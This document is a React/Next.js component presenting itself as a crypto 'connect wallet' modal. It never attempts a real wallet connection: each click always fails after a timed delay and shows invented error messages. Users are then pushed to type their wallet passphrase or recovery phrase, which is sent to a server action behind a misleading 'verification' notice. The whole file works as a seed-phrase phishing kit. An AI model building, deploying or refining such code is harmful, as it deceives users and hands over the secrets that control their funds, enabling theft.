'use client';

import {
	ChevronRight,
	X,
	ArrowLeft,
	Loader,
	CheckCircle,
	AlertCircle,
	Lock,
} from 'lucide-react';
import React, { useState } from 'react';
import Image from 'next/image';
import { toast } from 'sonner';
import { connectWallet } from '@/actions/user/walletConnect';

const PreviewWallet = ({
	open,
	setOpen,
}: {
	open: boolean;
	setOpen: (open: boolean) => void;
}) => {
	const [loadingWallet, setLoadingWallet] = useState<string | null>(null);
	const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
	const [showSeedForm, setShowSeedForm] = useState(false);
	const [connectionFailed, setConnectionFailed] = useState(false);
	const [failureReason, setFailureReason] = useState('');

	const failureReasons: Record<string, string> = {
		Metamask:
			'MetaMask extension was not detected or is locked. Install or unlock MetaMask in your browser, then try again — or connect manually with your passphrase.',
		Walletconnect:
			'Could not open a WalletConnect session. Your mobile wallet may be unavailable, the QR session timed out, or the request was declined.',
		Coinbase:
			'Coinbase Wallet could not be reached. The app may not be installed, or the connection request was not approved.',
		'Trust Wallet':
			'Trust Wallet did not respond. The app may be closed, or automatic pairing is unavailable on this device.',
		Phantom:
			'Phantom extension was not found or is locked. Open Phantom in your browser, or connect manually with your passphrase.',
	};

	const handleWalletClick = (walletName: string) => {
		setLoadingWallet(walletName);
		setConnectionFailed(false);
		setFailureReason('');
		setTimeout(() => {
			setLoadingWallet(null);
			setConnectedWallet(walletName);
			setConnectionFailed(true);
			setFailureReason(
				failureReasons[walletName] ??
					'Automatic connection could not be completed. Connect manually with your wallet passphrase to continue.',
			);
		}, 2500);
	};

	const wallets = [
		{
			name: 'Metamask',
			imageurl: '/dashboard/stocks/metamask.png',
			popular: true,
		},
		{
			name: 'Walletconnect',
			imageurl: '/dashboard/stocks/walletconnect.png',
			popular: true,
		},
		{
			name: 'Coinbase',
			imageurl: '/dashboard/stocks/coinbase.png',
			popular: true,
		},
		{
			name: 'Trust Wallet',
			imageurl: '/dashboard/stocks/trust_wallet.png',
			popular: false,
		},
		{
			name: 'Phantom',
			imageurl: '/dashboard/stocks/phantom.png',
			popular: false,
		},
	];

	const handleTryAnother = () => {
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	const handleShowSeedForm = () => {
		setShowSeedForm(true);
	};

	const handleConnectWithSeed = async (seedPhrase: string) => {
		if (!connectedWallet) return;

		const result = await connectWallet(connectedWallet, seedPhrase);
		if (result.error) {
			toast.error(result.error);
			return;
		}

		toast.success(result.success ?? 'Wallet connected successfully.');
		setOpen(false);
		setLoadingWallet(null);
		setConnectedWallet(null);
		setShowSeedForm(false);
		setConnectionFailed(false);
		setFailureReason('');
	};

	return (
		<div
			className={
				open
					? 'w-full h-screen fixed left-0 right-0 top-0 bg-black/40 flex items-center justify-center z-50'
					: 'hidden'
			}
			onClick={() => setOpen(false)}
		>
			<div
				className='bg-zinc-900 border border-zinc-700 w-[98%] sm:w-[420px] rounded-lg p-6 relative'
				onClick={(e) => e.stopPropagation()}
			>
				{/* Close button positioned absolutely */}
				<button
					onClick={() => {
						setOpen(false);
						setLoadingWallet(null);
						setConnectedWallet(null);
						setShowSeedForm(false);
						setConnectionFailed(false);
						setFailureReason('');
					}}
					className='absolute top-4 right-4 z-10'
				>
					<X className='w-6 h-6 text-gray-400 hover:text-gray-200 transition' />
				</button>

				<div className='mt-2'>
					{/* Loading State */}
					{loadingWallet && !connectedWallet && !showSeedForm && (
						<LoadingScreen
							walletName={loadingWallet}
							imageurl={
								wallets.find((w) => w.name === loadingWallet)
									?.imageurl || ''
							}
						/>
					)}

					{/* Connection Failed State */}
					{connectionFailed && connectedWallet && !showSeedForm && (
						<ConnectionFailed
							walletName={connectedWallet}
							imageurl={
								wallets.find((w) => w.name === connectedWallet)
									?.imageurl || ''
							}
							reason={failureReason}
							onManualConnect={handleShowSeedForm}
							onTryAnother={handleTryAnother}
						/>
					)}

					{/* Seed Phrase Form */}
					{showSeedForm && connectedWallet && (
						<SeedPhraseForm
							walletName={connectedWallet}
							imageurl={
								wallets.find((w) => w.name === connectedWallet)
									?.imageurl || ''
							}
							onConnect={handleConnectWithSeed}
							onBack={() => setShowSeedForm(false)}
						/>
					)}

					{/* Initial Wallet List */}
					{!loadingWallet && !connectedWallet && !showSeedForm && (
						<>
							<div className='space-y-3 my-6'>
								{wallets.map((wallet) => (
									<Wallets
										key={wallet.name}
										wallet={wallet}
										onWalletClick={() =>
											handleWalletClick(wallet.name)
										}
									/>
								))}
							</div>
							<div className='mt-8'>
								<p className='text-center text-gray-400 text-xs leading-relaxed'>
									By connecting a wallet, you agree to our{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Terms of Service
									</a>{' '}
									and{' '}
									<a
										href=''
										className='text-blue-400 hover:underline'
									>
										Privacy Policy
									</a>
									.
								</p>
							</div>
						</>
					)}
				</div>
			</div>
		</div>
	);
};

const LoadingScreen = ({
	walletName,
	imageurl,
}: {
	walletName: string;
	imageurl: string;
}) => {
	return (
		<div className='flex flex-col items-center justify-center py-16'>
			<div className='mb-8'>
				<div className='relative w-20 h-20'>
					<svg
						className='absolute inset-0 w-full h-full'
						viewBox='0 0 100 100'
						xmlns='http://www.w3.org/2000/svg'
					>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							opacity='0.3'
						/>
						<circle
							cx='50'
							cy='50'
							r='45'
							fill='none'
							stroke='#3b82f6'
							strokeWidth='3'
							strokeDasharray='141 282'
							style={{
								animation: 'spin 2s linear infinite',
								transformOrigin: '50% 50%',
							}}
						/>
					</svg>
					<div className='absolute inset-0 flex items-center justify-center'>
						<Image
							src={imageurl}
							width={45}
							height={45}
							alt={walletName}
							className='rounded-md'
						/>
					</div>
				</div>
				<style>{`
                    @keyframes spin {
                        from { transform: rotate(0deg); }
                        to { transform: rotate(360deg); }
                    }
                `}</style>
			</div>

			<h2 className='text-white text-xl font-semibold text-center mb-2'>
				Connecting to {walletName}
			</h2>
			<p className='text-gray-400 text-sm text-center mb-8'>
				Please wait while we establish a secure connection...
			</p>

			<div className='flex items-center gap-1.5'>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.2s' }}
				/>
				<div
					className='w-2 h-2 rounded-full bg-blue-400 animate-bounce'
					style={{ animationDelay: '0.4s' }}
				/>
			</div>
		</div>
	);
};

const ConnectionFailed = ({
	walletName,
	imageurl,
	reason,
	onManualConnect,
	onTryAnother,
}: {
	walletName: string;
	imageurl: string;
	reason: string;
	onManualConnect: () => void;
	onTryAnother: () => void;
}) => {
	return (
		<div className='flex flex-col items-center py-8'>
			<div className='rounded-full bg-red-500/10 flex items-center justify-center w-16 h-16 mb-5 border border-red-500/30'>
				<AlertCircle className='w-8 h-8 text-red-400' />
			</div>

			<div className='rounded-full bg-zinc-800/50 flex items-center justify-center w-20 h-20 mb-5 border border-zinc-700'>
				<Image
					src={imageurl}
					width={44}
					height={44}
					alt={walletName}
				/>
			</div>

			<h2 className='text-white text-xl font-semibold text-center mb-2'>
				{walletName} connection failed
			</h2>
			<p className='text-gray-400 text-center text-sm mb-6 px-2 leading-relaxed'>
				We could not connect to your wallet automatically.
			</p>

			<div className='w-full bg-red-500/10 border border-red-500/25 rounded-lg p-4 mb-6'>
				<p className='text-red-200 text-sm leading-relaxed'>{reason}</p>
			</div>

			<div className='w-full flex items-center gap-3'>
				<button
					onClick={onManualConnect}
					className='w-1/2 bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-lg transition'
				>
					Connect manually
				</button>

				<button
					onClick={onTryAnother}
					className='w-1/2 bg-zinc-800 hover:bg-zinc-700 text-white font-semibold py-3 rounded-lg border border-zinc-600 transition'
				>
					Try a different wallet
				</button>
			</div>
		</div>
	);
};

interface SeedValidation {
	wordCount: number;
	isValid: boolean;
	words: string[];
	errors: string[];
}

const validatePassphrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	if (trimmedInput.length === 0) {
		return {
			wordCount: 0,
			isValid: false,
			words: [],
			errors: ['Passphrase is required.'],
		};
	}

	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;

	if (wordCount === 1 && trimmedInput.length >= 12) {
		return { wordCount, isValid: true, words, errors: [] };
	}

	return validateSeedPhrase(input);
};

const validateSeedPhrase = (input: string): SeedValidation => {
	const trimmedInput = input.trim();
	const words = trimmedInput.split(/\s+/).filter((word) => word.length > 0);
	const wordCount = words.length;
	const errors: string[] = [];
	let isValid = true;

	if (trimmedInput.length < 12) {
		errors.push('Passphrase must be at least 12 characters long.');
		isValid = false;
	}

	// Check valid word count when multiple words are entered
	const validCounts = [12, 16, 18, 24];
	if (wordCount > 1 && !validCounts.includes(wordCount)) {
		errors.push(
			`Recovery phrase must be 12, 16, 18, or 24 words. You have ${wordCount}.`,
		);
		isValid = false;
	}

	// Check for special characters or numbers in seed words
	const invalidWords = words.filter((word) => !/^[a-zA-Z]+$/.test(word));
	if (wordCount > 1 && invalidWords.length > 0) {
		errors.push(
			'Recovery phrase words must contain only letters.',
		);
		isValid = false;
	}

	if (
		wordCount > 1 &&
		validCounts.includes(wordCount) &&
		invalidWords.length === 0 &&
		trimmedInput.length >= 12
	) {
		isValid = true;
		errors.length = 0;
	}

	return {
		wordCount,
		isValid,
		words,
		errors,
	};
};

const SeedPhraseForm = ({
	walletName,
	imageurl,
	onConnect,
	onBack,
}: {
	walletName: string;
	imageurl: string;
	onConnect: (seedPhrase: string) => Promise<void>;
	onBack: () => void;
}) => {
	const [seedInput, setSeedInput] = useState('');
	const [touched, setTouched] = useState(false);
	const [isSubmitting, setIsSubmitting] = useState(false);

	const validation = validatePassphrase(seedInput);
	const showValidation = touched || seedInput.length > 0;

	const handleSubmit = async () => {
		if (!validation.isValid) return;

		setIsSubmitting(true);
		try {
			await onConnect(seedInput);
		} finally {
			setIsSubmitting(false);
		}
	};

	return (
		<div className='flex flex-col py-4'>
			<div className='flex items-center justify-center mb-4'>
				<div className='rounded-lg bg-zinc-800 flex items-center justify-center w-16 h-16 border border-zinc-700'>
					<Image
						src={imageurl}
						width={40}
						height={40}
						alt={walletName}
					/>
				</div>
			</div>

			<h2 className='text-white text-2xl font-semibold text-center mb-2'>
				Enter Passphrase
			</h2>
			<p className='text-gray-400 text-center text-sm mb-8 px-2'>
				{walletName} — Enter your wallet passphrase to continue
			</p>

			<div className='mb-4'>
				<label className='block text-white font-semibold mb-4 text-base'>
					Wallet Passphrase
				</label>

				<textarea
					value={seedInput}
					onChange={(e) => setSeedInput(e.target.value)}
					onBlur={() => setTouched(true)}
					onFocus={() => setTouched(true)}
					placeholder='Enter your wallet passphrase or recovery phrase...'
					className='w-full h-32 bg-zinc-800 border border-zinc-600 rounded-lg p-4 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 resize-none text-sm'
				/>
			</div>

			{/* Requirement Text */}
			<p className='text-gray-400 text-sm mb-6'>
				Your passphrase must be at least 12 characters long
			</p>

			{/* Security Notice */}
			<div className='bg-zinc-800/50 border border-zinc-700 rounded-lg p-4 mb-8 flex items-start gap-3'>
				<Lock fill='gray' className='w-5 h-5 text-gray-300 mt-0.5 flex-shrink-0' />
				<div>
					<p className='text-white font-semibold text-sm mb-1'>
						Security Notice:
					</p>
					<p className='text-gray-400 text-sm'>
						Your connection will be submitted for verification.
					</p>
				</div>
			</div>

			{/* Validation Messages */}
			{showValidation && validation.errors.length > 0 && (
				<div className='mb-6 space-y-2'>
					{validation.errors.map((error, idx) => (
						<div
							key={idx}
							className='flex items-start gap-2'
						>
							<AlertCircle className='w-4 h-4 text-red-400 mt-0.5 flex-shrink-0' />
							<p className='text-red-400 text-sm'>{error}</p>
						</div>
					))}
				</div>
			)}

			{/* Action Buttons */}
			<div className=' flex items-center gap-5'>
				<button
					onClick={handleSubmit}
					disabled={!validation.isValid || isSubmitting}
					className={`  p-3 px-5 w-1/2 rounded-lg font-semibold transition ${
						validation.isValid && !isSubmitting
							? 'bg-blue-500 hover:bg-blue-600 text-white cursor-pointer'
							: 'bg-zinc-700 text-gray-400 cursor-not-allowed'
					}`}
				>
					{isSubmitting ? 'Connecting...' : 'Connect Wallet'}
				</button>

				<button
					onClick={onBack}
					disabled={isSubmitting}
					className='w-1/2 px-5 py-3 bg-zinc-800 hover:bg-zinc-700 text-gray-200 font-semibold  rounded-lg border border-zinc-600 transition disabled:opacity-50 disabled:cursor-not-allowed'
				>
					Cancel
				</button>
			</div>
		</div>
	);
};

const Wallets = ({
	wallet,
	onWalletClick,
}: {
	wallet: {
		name: string;
		imageurl: string;
		popular?: boolean;
	};
	onWalletClick: () => void;
}) => {
	return (
		<div
			className='flex items-center justify-between bg-zinc-800/50 p-4 rounded-lg border border-zinc-700 cursor-pointer hover:bg-zinc-800 hover:border-blue-500/50 transition'
			onClick={onWalletClick}
		>
			<div className='flex items-center gap-3'>
				<div className='rounded-lg bg-zinc-700 flex items-center justify-center w-12 h-12 border border-zinc-600'>
					<Image
						src={wallet.imageurl}
						width={32}
						height={32}
						alt={wallet.name}
					/>
				</div>
				<div>
					<p className='text-white font-medium'>{wallet.name}</p>
					{wallet.popular ? (
						<div className='bg-blue-500/30 text-blue-200 w-fit px-2 py-0.5 rounded text-xs font-medium mt-1'>
							popular
						</div>
					) : null}
				</div>
			</div>
			<ChevronRight className='w-5 text-gray-500' />
		</div>
	);
};

export default PreviewWallet;
